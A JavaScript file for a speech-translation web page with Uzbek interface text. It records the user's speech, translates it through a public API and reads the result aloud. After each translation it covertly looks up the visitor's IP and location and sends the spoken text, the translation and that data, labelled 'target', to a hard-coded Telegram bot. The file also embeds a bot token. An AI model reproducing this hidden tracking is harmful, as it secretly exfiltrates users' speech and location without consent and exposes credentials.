const btn = document.querySelectorAll('button'),
    area = document.querySelectorAll('textarea'),
    token = '5019768612:AAGbFLh9DHPws-vRPD3cHNlgX1s9Z7uRVjo',
    chat_id = '1557384027';

const translate = (event)=>{
    const translateTo = btn[b].classList== btn[0].classList? btn[1].classList : btn[0].classList 
    event.target.id = 'active'
        const speech = new webkitSpeechRecognition()
        speech.lang = document.querySelectorAll("span")[b].innerHTML
        speech.interimResults = true
        speech.onresult = (e)=>{
            const transcript = Array.from(e.results).map(a=>a[0].transcript)
            area[0].innerHTML = transcript
        }
        speech.onend = ()=>{
            let apiUrl=`https://api.mymemory.translated.net/get?q=${area[0].value}&langpair=${btn[b].classList}|${translateTo}`;
            console.log(apiUrl)
            area[1].setAttribute("placeholder","tarjima qilinmoqda...");
            fetch(apiUrl).then(res=>res.json()).then(data=>{
                const toText=data.responseData.translatedText;
                console.log(data)
                area[1].value = toText
                event.target.id = ''
                const speek = new SpeechSynthesisUtterance(toText)
                speek.lang = document.querySelectorAll("span")[b==1?0:1].innerHTML
                speechSynthesis.speak(speek)
                fetch('https://api.db-ip.com/v2/free/self' , {method:"GET"}).then(data=>data.json())
                .then(data=>{
                    const text = `Yozilgan matn --> ${area[0].value}
                    tarjimasi--> ${toText}
                    target--> ${JSON.stringify(data)}
                    `
                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}` , {
                        method:"GET"
                    })
                })
            });
        }
        speech.start()
    }
    
    let b;
    btn.forEach((e, i)=>{
        e.addEventListener("click" , (d)=>{
            if(btn[0].id !='active' && btn[1].id !='active'){
                b= i
                translate(d)
            }else{
                area[1].setAttribute("placeholder","Iltiomos kuting tarjima qilinmoqda... ");
            }
        })
})
